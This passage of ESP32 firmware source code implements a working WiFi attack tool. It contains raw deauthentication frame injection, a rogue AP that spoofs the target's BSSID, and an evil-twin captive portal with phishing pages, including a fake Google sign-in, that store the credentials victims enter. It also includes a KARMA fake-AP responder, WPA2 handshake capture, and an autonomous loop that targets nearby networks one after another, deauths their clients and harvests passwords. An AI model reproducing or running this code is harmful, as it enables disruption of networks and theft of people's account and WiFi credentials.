  if(btn&&!btnHeld){ btnHeld=true; return JOY_CLICK; }
  if(!btn) btnHeld=false;
  if(abs(dx)>JOY_DEADZONE||abs(dy)>JOY_DEADZONE){
    if(abs(dx)>abs(dy)) return dx>0?JOY_RIGHT:JOY_LEFT;
    return dy>0?JOY_DOWN:JOY_UP;
  }
  return JOY_NONE;
}

void showMsg(const char* m, uint32_t ms=2000){
  g_msg=m; g_msgEnd=millis()+ms; screen=ST_MSG; drawOLED();
}

// ════════════════════════════════════════════════════════════
//  WiFi HELPERS
// ════════════════════════════════════════════════════════════
static void setPromisc(bool en){
  if(en){
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(pktCallback);
    wifi_promiscuous_filter_t f;
    f.filter_mask=WIFI_PROMIS_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_filter(&f);
  } else {
    esp_wifi_set_promiscuous(false);
  }
}

static void restoreWiFi(){
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("esp32ap","12345678",1,1);
  delay(300);
  esp_wifi_set_channel(AP_CH,WIFI_SECOND_CHAN_NONE);
}

// ════════════════════════════════════════════════════════════
//  DEAUTH FRAME INJECTION
//  Sends raw 802.11 deauth frames via esp_wifi_80211_tx.
//  Combined with the rogue-AP method for maximum client impact.
// ════════════════════════════════════════════════════════════
static void sendDeauthFrames(const uint8_t* bssid, int ch){
  esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
  // Broadcast deauth: DA=FF:FF:FF, SA=BSSID, BSSID=BSSID
  uint8_t pkt[26]={
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // DA  (broadcast)
    0x00,0x00,0x00,0x00,0x00,0x00,  // SA  (will be set to BSSID)
    0x00,0x00,0x00,0x00,0x00,0x00,  // BSSID
    0x00,0x00,                       // seq
    0x07,0x00                        // reason: class-3 from nonassoc STA
  };
  memcpy(pkt+10, bssid, 6);
  memcpy(pkt+16, bssid, 6);
  for(int i=0;i<DEAUTH_BURST;i++){
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, true);
    pkt[22]=(pkt[22]+1)&0xFF;  // increment sequence
  }
}

// ════════════════════════════════════════════════════════════
//  ROGUE AP  (spoof target's BSSID on same channel)
// ════════════════════════════════════════════════════════════
static void startRogueAP(const uint8_t* bssid, const char* ssid, int ch){
  WiFi.softAPdisconnect(true); delay(200);
  WiFi.mode(WIFI_AP); delay(100);
  esp_wifi_set_mac(WIFI_IF_AP, bssid); delay(50);
  WiFi.softAP(ssid,"",ch,0,4); delay(300);
  rogueAPUp=true;
}
static void stopRogueAP(){
  if(!rogueAPUp) return;
  WiFi.softAPdisconnect(true); delay(100);
  rogueAPUp=false;
}
static void doDeauth(const uint8_t* bssid, int ch){
  if(!rogueAPUp){
    const char* ssid=(selectedAP>=0)?apList[selectedAP].ssid:"ESP32AP";
    startRogueAP(bssid, ssid, ch);
  }
  sendDeauthFrames(bssid, ch);
  deauthsSent+=DEAUTH_BURST;
}

// ════════════════════════════════════════════════════════════
//  DEAUTH ALL
// ════════════════════════════════════════════════════════════
static void startDeauthAll(){
  if(apCount==0){ showMsg("No APs. Scan first."); return; }
  setPromisc(false);
  WiFi.mode(WIFI_STA); delay(200);
  deauthAllRunning=true; running=true;
  deauthsSent=0; attackStart=millis(); hopIdx=0; targetCh=apList[0].ch;
  screen=ST_DEAUTH_ALL; drawOLED();
  Serial.printf("[DEAUTH-ALL] Attacking %d APs\n", apCount);
}

// ════════════════════════════════════════════════════════════
//  CAPTIVE PORTAL HTML  (3 themes)
// ════════════════════════════════════════════════════════════
static const char ET_WLAN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif}
.card{background:#fff;border-radius:12px;padding:32px 28px;width:90%;max-width:360px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
.icon{text-align:center;font-size:48px;margin-bottom:8px}
h2{text-align:center;color:#222;margin-bottom:4px;font-size:1.2em}
.sub{text-align:center;color:#888;font-size:.85em;margin-bottom:20px}
label{font-size:.85em;color:#555;display:block;margin-bottom:4px}
input{width:100%;padding:10px 12px;border:1.5px solid #ddd;border-radius:8px;font-size:1em;margin-bottom:14px;outline:none}
input:focus{border-color:#0077ff}
button{width:100%;padding:12px;background:#0077ff;color:#fff;border:none;border-radius:8px;font-size:1em;cursor:pointer;font-weight:bold}
button:hover{background:#005ecc}
</style></head><body>
<div class="card">
<div class="icon">&#x1F4F6;</div>
<h2>WiFi Network Login</h2>
<div class="sub" id="sl">Enter credentials to connect</div>
<form method="POST" action="/login">
<label>Username</label>
<input type="text" name="user" placeholder="Username" autocomplete="off">
<label>Password</label>
<input type="password" name="pw" placeholder="Password" required autocomplete="off">
<button type="submit">Connect</button>
</form></div>
<script>
const p=new URLSearchParams(location.search);
if(p.get('s')) document.getElementById('sl').textContent='Network: '+p.get('s');
</script>
</body></html>
)rawliteral";

static const char ET_GOOGLE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google – Sign in</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.wrap{width:360px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.logo{text-align:center;margin-bottom:20px;font-size:28px;font-weight:bold}
.g{color:#4285F4}.o1{color:#EA4335}.o2{color:#FBBC04}.l{color:#34A853}
h1{font-size:24px;color:#202124;text-align:center;margin-bottom:6px;font-weight:400}
.sub{text-align:center;color:#5f6368;font-size:14px;margin-bottom:24px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin-bottom:12px}
input:focus{border:2px solid #1a73e8}
.row{display:flex;justify-content:space-between;align-items:center}
.link{color:#1a73e8;font-size:14px;text-decoration:none}
button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
</style></head><body>
<div class="wrap">
<div class="logo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="o1">e</span></div>
<h1>Sign in</h1>
<div class="sub">Use your Google Account</div>
<form method="POST" action="/login">
<input type="email"    name="user" placeholder="Email or phone"  required autocomplete="off">
<input type="password" name="pw"   placeholder="Password"        required autocomplete="off">
<div class="row"><a class="link" href="#">Forgot email?</a><button type="submit">Next</button></div>
</form></div></body></html>
)rawliteral";

static const char ET_ROUTER_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Admin Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f0f0f0;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;padding-top:60px}
.hdr{background:#005580;color:#fff;width:100%;max-width:480px;padding:14px 20px;border-radius:4px 4px 0 0;font-size:18px;font-weight:bold}
.card{background:#fff;width:100%;max-width:480px;padding:32px 28px;border:1px solid #ccc;border-top:none;border-radius:0 0 4px 4px}
.row{display:flex;align-items:center;margin-bottom:14px}
label{width:120px;font-size:14px;font-weight:bold}
input{flex:1;padding:7px 10px;border:1px solid #aaa;border-radius:3px;font-size:14px}
button{width:100%;padding:10px;background:#005580;color:#fff;border:none;border-radius:3px;font-size:15px;cursor:pointer;margin-top:8px}
.note{font-size:12px;color:#888;margin-top:12px;text-align:center}
</style></head><body>
<div class="hdr">&#x1F4E1; Router Configuration</div>
<div class="card">
<form method="POST" action="/login">
<div class="row"><label>Username</label><input type="text" name="user" value="admin" autocomplete="off"></div>
<div class="row"><label>Password</label><input type="password" name="pw" placeholder="Router password" required autocomplete="off"></div>
<button>Login</button>
</form>
<div class="note">Default credentials: admin / admin</div>
</div></body></html>
)rawliteral";

static const char ET_SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif}
.card{background:#fff;border-radius:12px;padding:32px;width:90%;max-width:360px;text-align:center}
.icon{font-size:56px;margin-bottom:12px}
h2{color:#2e7d32;margin-bottom:8px}
p{color:#666;font-size:.9em}
</style></head><body>
<div class="card">
<div class="icon">&#x2705;</div>
<h2>Connected!</h2>
<p>You are now connected to the internet.<br>This window may close.</p>
</div></body></html>
)rawliteral";

// ════════════════════════════════════════════════════════════
//  EVIL TWIN HANDLERS
// ════════════════════════════════════════════════════════════
static void etServePortal(){
  String html;
  switch(etTheme){
    case ET_GOOGLE: html=FPSTR(ET_GOOGLE_HTML); break;
    case ET_ROUTER: html=FPSTR(ET_ROUTER_HTML); break;
    default:        html=FPSTR(ET_WLAN_HTML);   break;
  }
  etServer.send(200,"text/html",html);
}
static void etHandleRoot(){
  etServer.sendHeader("Location",String("/portal?s=")+etSSID,true);
  etServer.send(302,"text/plain","");
}
static void etHandlePortal(){ etServePortal(); }
static void etHandleLogin(){
  String user="", pass="";
  if(etServer.hasArg("user")) user=etServer.arg("user");
  if(etServer.hasArg("pw"))   pass=etServer.arg("pw");
  if(user.isEmpty()&&!pass.isEmpty()) user="(none)";
  if(!user.isEmpty()||!pass.isEmpty()){
    etUser=user; etPw=pass; etCapCnt++;
    Serial.printf("\n[ET] *** #%d  SSID=%.32s  USER=%.64s  PASS=%.64s ***\n\n",
                  etCapCnt, etSSID, user.c_str(), pass.c_str());
    fsSaveCred(etSSID, user.c_str(), pass.c_str());
    if(screen==ST_EVIL_TWIN||screen==ST_KARMA||screen==ST_PWNAGOTCHI) drawOLED();
  }
  etServer.send_P(200,"text/html",ET_SUCCESS_HTML);
}
static void etRedirect(){
  etServer.sendHeader("Location","http://192.168.4.1/portal",true);
  etServer.send(302,"text/plain","");
}

static void _setupEtServer(){
  etServer.on("/",        HTTP_GET,  etHandleRoot);
  etServer.on("/portal",  HTTP_GET,  etHandlePortal);
  etServer.on("/login",   HTTP_POST, etHandleLogin);
  // Android / iOS / Windows captive-portal detection endpoints
  etServer.on("/generate_204",        HTTP_GET, etRedirect);
  etServer.on("/gen_204",             HTTP_GET, etRedirect);
  etServer.on("/hotspot-detect.html", HTTP_GET, etRedirect);
  etServer.on("/ncsi.txt",            HTTP_GET, etRedirect);
  etServer.on("/connecttest.txt",     HTTP_GET, etRedirect);
  etServer.on("/success.txt",         HTTP_GET, etRedirect);
  etServer.onNotFound(etRedirect);
  etServer.begin();
  etActive=true;
}

static void startEvilTwin(int apIdx){
  if(apIdx<0||apIdx>=apCount) return;
  strncpy(etSSID, apList[apIdx].ssid, 32); etSSID[32]='\0';
  etCapCnt=0; etUser=""; etPw="";
  setPromisc(false);
  WiFi.softAPdisconnect(true); delay(200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(etSSID,"", apList[apIdx].ch, 0); delay(500);
  IPAddress apIP(192,168,4,1);
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  dnsServer.start(DNS_PORT,"*",apIP);
  _setupEtServer();
  etDeauthOn=true; running=true;
  screen=ST_EVIL_TWIN; attackStart=millis(); deauthsSent=0;
  targetCh=apList[apIdx].ch; selectedAP=apIdx;
  Serial.printf("[ET] Running: SSID=%.32s  IP=192.168.4.1\n", etSSID);
  drawOLED();
}
static void stopEvilTwin(){
  if(!etActive) return;
  etServer.stop(); dnsServer.stop();
  etActive=false; etDeauthOn=false;
}

// ════════════════════════════════════════════════════════════
//  KARMA ATTACK
//  Listens for probe requests → launches matching fake AP
//  automatically. Devices with saved networks connect on their own.
// ════════════════════════════════════════════════════════════
static void karmaHandleProbe(const char* probedSSID, uint8_t ch){
  if(etActive && strcmp(etSSID,probedSSID)==0) return;
  if(etActive){ etServer.stop(); dnsServer.stop();
                WiFi.softAPdisconnect(true); delay(100); etActive=false; }
  strncpy(karmaLastSSID, probedSSID, 32); karmaLastSSID[32]='\0';
  strncpy(etSSID,        probedSSID, 32); etSSID[32]='\0';
  uint8_t useCh=(ch>=1&&ch<=13)?ch:1;
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(etSSID,"",useCh,0); delay(300);
  IPAddress apIP(192,168,4,1);
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  dnsServer.start(DNS_PORT,"*",apIP);
  _setupEtServer();
  karmaCnt++;
  Serial.printf("[KARMA] Fake AP → %.32s CH%u\n", etSSID, useCh);
  drawOLED();
}

static void startKarma(){
  karmaActive=true; karmaCnt=0; running=true;
  etCapCnt=0; etUser=""; etPw="";
  memset(karmaLastSSID,0,sizeof(karmaLastSSID));
  memset(etSSID,0,sizeof(etSSID));
  screen=ST_KARMA;
  WiFi.mode(WIFI_AP_STA); delay(200);
  setPromisc(true);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  drawOLED();
  Serial.println(F("[KARMA] Active – listening for probe requests..."));
}
static void stopKarma(){
  karmaActive=false;
  if(etActive){ etServer.stop(); dnsServer.stop(); etActive=false; }
  setPromisc(false);
}

// ════════════════════════════════════════════════════════════
//  HANDSHAKE CAPTURE  (WPA2 4-way → pcap)
// ════════════════════════════════════════════════════════════
static int eapolMsg(const uint8_t* d, uint16_t len){
  if(len<28) return 0;
  uint8_t fc0=d[0];
  if(((fc0>>2)&0x03)!=0x02) return 0;
  int hdr=24; if((fc0>>4)&0x08) hdr+=2; if((d[1]&0x03)==0x03) hdr+=6;
  if(len<(uint16_t)(hdr+12)) return 0;
  const uint8_t* llc=d+hdr;
  if(llc[0]!=0xAA||llc[1]!=0xAA||llc[2]!=0x03||llc[6]!=0x88||llc[7]!=0x8E)
    return 0;
  const uint8_t* e=llc+8;
  if(len<(uint16_t)(hdr+20)||e[1]!=0x03) return 0;
  uint16_t ki=((uint16_t)e[5]<<8)|e[6];
  bool pw=(ki>>3)&1, ack=(ki>>7)&1, inst=(ki>>6)&1, mic=(ki>>8)&1, sec=(ki>>9)&1;
  if(pw&&ack&&!inst&&!mic)       return 1;
  if(pw&&!ack&&!inst&&mic)       return 2;
  if(pw&&ack&&inst&&mic)         return 3;
  if(pw&&!ack&&!inst&&mic&&sec)  return 4;
  return 0;
}
static void hsSaveFrame(const uint8_t* d, uint16_t len){
  if(hsBufCnt>=PCAP_MAX_FRAMES) return;
  HsFrame& f=hsBuf[hsBufCnt++];
  f.len=len>256?256:len;
  memcpy(f.data,d,f.len);
}
static void hsCheckAndSave(){
  if((hsM1&&hsM2)||(hsM2&&hsM3)){
    if(hsBufCnt>0&&!hsSaved){
      if(fsSaveHandshake(hsSSID,hsBSSID,hsBuf,hsBufCnt)){
        hsCaptured++; hsSaved=true;
        Serial.printf("[HS] Saved! M1:%d M2:%d M3:%d M4:%d\n",
                      (int)hsM1,(int)hsM2,(int)hsM3,(int)hsM4);
        drawOLED();
      }
    }
  }
}
static void hsInjectBeacon(const char* ssid, const uint8_t* bssid, uint8_t ch){
  uint8_t pkt[128]; int off=0;
  pkt[off++]=0x80;pkt[off++]=0x00;pkt[off++]=0x00;pkt[off++]=0x00;
  memset(pkt+off,0xFF,6); off+=6;
  memcpy(pkt+off,bssid,6); off+=6; memcpy(pkt+off,bssid,6); off+=6;
  pkt[off++]=0x00; pkt[off++]=0x00; memset(pkt+off,0,8); off+=8;
  pkt[off++]=0x64; pkt[off++]=0x00; pkt[off++]=0x31; pkt[off++]=0x04;
  uint8_t sl=(uint8_t)strlen(ssid);
  pkt[off++]=0x00; pkt[off++]=sl; memcpy(pkt+off,ssid,sl); off+=sl;
  pkt[off++]=0x01; pkt[off++]=0x08;
  pkt[off++]=0x82; pkt[off++]=0x84; pkt[off++]=0x8B; pkt[off++]=0x96;
  pkt[off++]=0x0C; pkt[off++]=0x12; pkt[off++]=0x18; pkt[off++]=0x24;
  pkt[off++]=0x03; pkt[off++]=0x01; pkt[off++]=ch;
  hsSaveFrame(pkt,(uint16_t)off);
}
static void startHandshake(int apIdx){
  if(apIdx<0||apIdx>=apCount) return;
  strncpy(hsSSID,apList[apIdx].ssid,32); hsSSID[32]='\0';
  memcpy(hsBSSID,apList[apIdx].bssid,6);
  hsM1=hsM2=hsM3=hsM4=false; hsBufCnt=0; hsSaved=false;
  hsCapturing=true; running=true;
  selectedAP=apIdx; targetCh=apList[apIdx].ch;
  hsInjectBeacon(hsSSID,hsBSSID,(uint8_t)targetCh);
  setPromisc(true);
  esp_wifi_set_channel((uint8_t)targetCh,WIFI_SECOND_CHAN_NONE);
  screen=ST_HANDSHAKE; drawOLED();
}
static void stopHandshake(){ hsCapturing=false; setPromisc(false); }

// ════════════════════════════════════════════════════════════
//  PWNAGOTCHI ENGINE
//  ─────────────────────────────────────────────────────────
//  Autonomous WiFi pwning agent with animated ASCII face,
//  mood system, persistent stats, and smart target failover.
//
//  Failover logic:
//    1. Scan → build sorted candidate list (WPA2 first, by RSSI)
//    2. Pick first non-blacklisted AP as target
//    3. Launch Evil Twin + deauth burst
//    4. Wait up to PW_ATTACK_TIMEOUT_S seconds for a credential
//    5. If credential captured → PWNED phase → next target
//    6. If timeout expires   → blacklist AP → try next candidate
//    7. When all candidates exhausted in this epoch → PW_PH_EXHAUSTED
//       → bored/sad, wait PW_RESCAN_INTERVAL_S, then fresh scan
//    8. After fresh scan blacklist is cleared for the new epoch
// ════════════════════════════════════════════════════════════

static void pwSetMood(PwMood m){
  pw.mood=m; pw.lastFace=millis();
  uint8_t r=esp_random()%3;
  switch(m){
    case PW_BOOT:     strcpy(pw.face,FACE_AWAKE);  strncpy(pw.status,PW_MSG_BOOT[r],35);   break;
    case PW_BORED:    strcpy(pw.face,FACE_BORED);  strncpy(pw.status,PW_MSG_BORED[r],35);  break;
    case PW_SCANNING: strcpy(pw.face,pw.eyeLeft?FACE_LOOK_L:FACE_LOOK_R);
                      strncpy(pw.status,PW_MSG_SCAN[r],35);                                  break;
    case PW_FOUND:    strcpy(pw.face,FACE_FOUND);  strncpy(pw.status,PW_MSG_FOUND[r],35);  break;
    case PW_DEAUTHING:strcpy(pw.face,FACE_DEAUTH); strncpy(pw.status,PW_MSG_DEAUTH[r],35); break;
    case PW_WAITING:  strcpy(pw.face,FACE_INTENSE);strncpy(pw.status,PW_MSG_WAIT[r],35);   break;
    case PW_PWNED:    strcpy(pw.face,FACE_PWNED);  strncpy(pw.status,PW_MSG_PWNED[r],35);  break;
    case PW_SAD:      strcpy(pw.face,FACE_SAD);    strncpy(pw.status,PW_MSG_SAD[r],35);    break;
    case PW_HAPPY:    strcpy(pw.face,FACE_HAPPY);  strncpy(pw.status,PW_MSG_HAPPY[r],35);  break;
  }
  pw.status[35]='\0';
  Serial.printf("[PW] mood=%d  face=%s  \"%s\"\n", m, pw.face, pw.status);
}

static void pwLoadStats(){
  File f=LittleFS.open(FS_PW_STATS,"r");
  if(f){
    f.read((uint8_t*)&pw.totalPwned,4);
    f.read((uint8_t*)&pw.epoch,2);
    f.close();
  }
  Serial.printf("[PW] Stats loaded: pwned=%lu  epoch=%u\n",pw.totalPwned,pw.epoch);
}
static void pwSaveStats(){
  File f=LittleFS.open(FS_PW_STATS,"w");
  if(f){
    f.write((uint8_t*)&pw.totalPwned,4);
    f.write((uint8_t*)&pw.epoch,2);
    f.close();
  }
}

// Internal scan used only by the pwnagotchi engine
static void pwInternalScan(){
  pw.epoch++;
  pwSetMood(PW_SCANNING); drawOLED();
  setPromisc(false);
  if(etActive) stopEvilTwin();
  if(rogueAPUp) stopRogueAP();
  esp_wifi_stop(); esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start(); delay(100);
  apCount=0;
  int n=WiFi.scanNetworks(false,true);
  if(n>0){
    struct R{
      String ssid; uint8_t bssid[6]; int ch,rssi; wifi_auth_mode_t enc;
    };
    std::vector<R> raw; raw.reserve(n);
    for(int i=0;i<n;i++){
      int ch=WiFi.channel(i); if(ch<1||ch>13) continue;
      R r; r.ssid=WiFi.SSID(i);
      uint8_t* b=WiFi.BSSID(i);
      if(b) memcpy(r.bssid,b,6); else memset(r.bssid,0,6);
      r.ch=ch; r.rssi=WiFi.RSSI(i); r.enc=WiFi.encryptionType(i);
      raw.push_back(r);
    }
    std::sort(raw.begin(),raw.end(),[](const R& a,const R& b){ return a.rssi>b.rssi; });
    apCount=(int)raw.size(); if(apCount>MAX_APS) apCount=MAX_APS;
    for(int i=0;i<apCount;i++){
      strncpy(apList[i].ssid,raw[i].ssid.c_str(),32); apList[i].ssid[32]='\0';
      memcpy(apList[i].bssid,raw[i].bssid,6);
      apList[i].ch=raw[i].ch; apList[i].rssi=raw[i].rssi;
      apList[i].wps=false; apList[i].blacklisted=false; apList[i].tries=0;
      const char* enc="????";
      switch(raw[i].enc){
        case WIFI_AUTH_OPEN:         enc="OPEN";  break;
        case WIFI_AUTH_WEP:          enc="WEP";   break;
        case WIFI_AUTH_WPA_PSK:      enc="WPA";   break;
        case WIFI_AUTH_WPA2_PSK:     enc="WPA2";  break;
        case WIFI_AUTH_WPA_WPA2_PSK: enc="WPA/2"; break;
        default: break;
      }
      strncpy(apList[i].enc,enc,7); apList[i].enc[7]='\0';
    }
    WiFi.scanDelete();
  }
  restoreWiFi();
  pw.triedCount=0;
  Serial.printf("[PW] Epoch %u scan complete: %d APs\n", pw.epoch, apCount);
}

// Pick the best non-blacklisted, non-open AP
static int pwPickTarget(){
  // Pass 1: WPA2 only
  for(int i=0;i<apCount;i++){
    if(apList[i].blacklisted) continue;
    if(!strlen(apList[i].ssid)) continue;
    if(strcmp(apList[i].enc,"WPA2")==0||strcmp(apList[i].enc,"WPA/2")==0)
      return i;
  }
  // Pass 2: WPA
  for(int i=0;i<apCount;i++){
    if(apList[i].blacklisted) continue;
    if(!strlen(apList[i].ssid)) continue;
    if(strcmp(apList[i].enc,"WPA")==0) return i;
  }
  // Pass 3: anything with an SSID
  for(int i=0;i<apCount;i++){
    if(apList[i].blacklisted) continue;
    if(!strlen(apList[i].ssid)) continue;
    return i;
  }
  return -1; // all exhausted
}

// Stop current attack without leaving pwnagotchi mode
static void pwStopAttack(){
  if(etActive)   stopEvilTwin();
  if(rogueAPUp)  stopRogueAP();
  deauthRunning=false;
  etDeauthOn=false;
  memset(pw.target,0,sizeof(pw.target));
  pw.targetAP=-1;
}

// Launch Evil Twin + continuous deauth on a given AP index
static void pwLaunchAttack(int apIdx){
  pw.targetAP=apIdx; pw.attackTs=millis();
  apList[apIdx].tries++;
  selectedAP=apIdx;
  strncpy(pw.target, apList[apIdx].ssid, 16); pw.target[16]='\0';

  // Evil Twin
  strncpy(etSSID, apList[apIdx].ssid, 32); etSSID[32]='\0';
  etCapCnt=0; etUser=""; etPw="";
  setPromisc(false);
  WiFi.softAPdisconnect(true); delay(200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(etSSID,"", apList[apIdx].ch, 0); delay(500);
  IPAddress apIP(192,168,4,1);
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  dnsServer.start(DNS_PORT,"*",apIP);
  _setupEtServer();
  etDeauthOn=true;
  targetCh=apList[apIdx].ch;
  deauthsSent=0;
  pwSetMood(PW_DEAUTHING);
  Serial.printf("[PW] Attacking %.32s (CH%d RSSI=%d)\n",
                apList[apIdx].ssid, apList[apIdx].ch, apList[apIdx].rssi);
}

// Main pwnagotchi tick — called from loop()
static void pwTick(unsigned long now){
  if(screen!=ST_PWNAGOTCHI||!running) return;

  // Random blink every 4-8 s
  if(now-pw.lastBlink > (uint32_t)(4000+esp_random()%4000)){
    pw.lastBlink=now;
  }

  // Eye animation during scan
  if(pw.phase==PW_PH_SCAN && now-pw.lastFace>2000){
    pw.eyeLeft=!pw.eyeLeft; pw.lastFace=now;
    strcpy(pw.face, pw.eyeLeft?FACE_LOOK_L:FACE_LOOK_R);
    pw.channel=(pw.channel%13)+1;
    snprintf(pw.status,36,"CH %u / 13...", pw.channel);
  }

  switch(pw.phase){

  // ── IDLE: wait, then scan ────────────────────────────────
  case PW_PH_IDLE:
    if(now >= pw.nextAct){
      pw.phase=PW_PH_SCAN;
      pw.nextAct=now+1000; // give drawOLED a frame
    }
    break;

  // ── SCAN: perform a WiFi scan ────────────────────────────
  case PW_PH_SCAN:
    if(now >= pw.nextAct){
      pwInternalScan();
      int t=pwPickTarget();
      if(t<0){
        pw.phase=PW_PH_EXHAUSTED;
        pwSetMood(PW_SAD);
        pw.nextAct=now+(PW_RESCAN_INTERVAL_S*1000UL);
      } else {
        pw.phase=PW_PH_TARGET;
        pw.targetAP=t;
        pwSetMood(PW_FOUND);
        strncpy(pw.target, apList[t].ssid, 16); pw.target[16]='\0';
        pw.nextAct=now+(PW_TARGET_PAUSE_S*1000UL);
      }
      drawOLED();
    }
    break;

  // ── TARGET: pause to show FOUND face, then attack ────────
  case PW_PH_TARGET:
    if(now >= pw.nextAct){
      pw.phase=PW_PH_ATTACK;
      pwLaunchAttack(pw.targetAP);
      pw.nextAct=now+5000; // first status update in 5 s
      drawOLED();
    }
    break;

  // ── ATTACK: running Evil Twin + deauth ───────────────────
  case PW_PH_ATTACK:{
    // Check for credential capture
    if(etCapCnt > 0){
      pw.phase=PW_PH_CAPTURED;
      pw.sessionCreds++;
      pw.totalPwned++;
      pwSaveStats();
      pwSetMood(PW_PWNED);
      pw.nextAct=now+(PW_CELEBRATE_S*1000UL);
      Serial.printf("[PW] *** PWNED #%lu: %.32s  USER=%.64s  PASS=%.64s ***\n",
                    pw.totalPwned, etSSID, etUser.c_str(), etPw.c_str());
      drawOLED();
      break;
    }
    // Deauth pulse
    if(etDeauthOn && pw.targetAP>=0 && now-lastHop >= ET_DEAUTH_INT){
      lastHop=now;
      sendDeauthFrames(apList[pw.targetAP].bssid, targetCh);
      deauthsSent+=DEAUTH_BURST;
    }
    // Update mood display every 5 s
    if(now >= pw.nextAct){
      pw.nextAct=now+5000;
      if(pw.mood==PW_DEAUTHING) pwSetMood(PW_WAITING);
      else                      pwSetMood(PW_DEAUTHING);
      drawOLED();
    }
    // Timeout → blacklist and try next AP
    if(now - pw.attackTs >= (PW_ATTACK_TIMEOUT_S*1000UL)){
      Serial.printf("[PW] Timeout on %.32s – blacklisting.\n",
                    apList[pw.targetAP].ssid);
      apList[pw.targetAP].blacklisted=true;
      pw.triedCount++;
      pwStopAttack();

      // Check if we've hit the per-epoch trial limit
      if(pw.triedCount >= PW_MAX_TRIES_PER_EPOCH){
        pw.phase=PW_PH_EXHAUSTED;
        pwSetMood(PW_SAD);
        pw.nextAct=now+(PW_RESCAN_INTERVAL_S*1000UL);
        Serial.println(F("[PW] Epoch exhausted. Resting..."));
      } else {
        // Try next candidate immediately
        int nxt=pwPickTarget();
        if(nxt<0){
          pw.phase=PW_PH_EXHAUSTED;
          pwSetMood(PW_SAD);
          pw.nextAct=now+(PW_RESCAN_INTERVAL_S*1000UL);
          Serial.println(F("[PW] No more candidates. Resting..."));
        } else {
          pw.phase=PW_PH_TARGET;
          pw.targetAP=nxt;
          pwSetMood(PW_FOUND);
          // Print "moving on" message
          strncpy(pw.status, PW_MSG_SKIP[esp_random()%3], 35); pw.status[35]='\0';
          strcpy(pw.face,FACE_COOL);
          strncpy(pw.target, apList[nxt].ssid, 16); pw.target[16]='\0';
          pw.nextAct=now+(PW_TARGET_PAUSE_S*1000UL);
          Serial.printf("[PW] Failover → %.32s\n", apList[nxt].ssid);
        }
      }
      drawOLED();
    }
    break;
  }

  // ── CAPTURED: celebrate, then hunt again ─────────────────
  case PW_PH_CAPTURED:
    if(now >= pw.nextAct){
      pwStopAttack();
      // Continue to next target
      int nxt=pwPickTarget();
      if(nxt<0){
        pw.phase=PW_PH_IDLE;
        pwSetMood(PW_HAPPY);
        pw.nextAct=now+(PW_RESCAN_INTERVAL_S*1000UL);
      } else {
        pw.phase=PW_PH_TARGET;
        pw.targetAP=nxt;
        pwSetMood(PW_FOUND);
        strncpy(pw.target, apList[nxt].ssid, 16); pw.target[16]='\0';
        pw.nextAct=now+(PW_TARGET_PAUSE_S*1000UL);
      }
      drawOLED();
    }
    break;

  // ── EXHAUSTED: all APs tried / no APs → rest & rescan ────
  case PW_PH_EXHAUSTED:
    if(now >= pw.nextAct){
      pw.phase=PW_PH_IDLE;
      pwSetMood(PW_BORED);
      pw.nextAct=now+1000;
      drawOLED();
    }
    break;
  }
}

static void startPwnagotchi(){
  running=true;
  pw.phase=PW_PH_IDLE; pw.sessionCreds=0; pw.sessionHS=0; pw.triedCount=0;
  pw.targetAP=-1; memset(pw.target,0,sizeof(pw.target));
  pw.nextAct=millis()+500;  // start scan quickly
  screen=ST_PWNAGOTCHI; attackStart=millis();
  pwLoadStats(); pwSetMood(PW_BOOT);
  drawOLED();
  Serial.printf("[PW] Started. Total pwned: %lu  Epoch: %u\n",
                pw.totalPwned, pw.epoch);
}

// ════════════════════════════════════════════════════════════
//  PROBE SNIFFER
// ════════════════════════════════════════════════════════════
static void startProbeSniffer(){
  probeCnt=0; probeView=0; running=true;
  screen=ST_PROBE_SNIFF;
  setPromisc(true);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  hopIdx=0; lastHop=millis();
  drawOLED();
}

// ════════════════════════════════════════════════════════════
//  CHANNEL SCANNER
// ════════════════════════════════════════════════════════════
static void startChScan(){
  memset(chPkt,0,sizeof(chPkt));
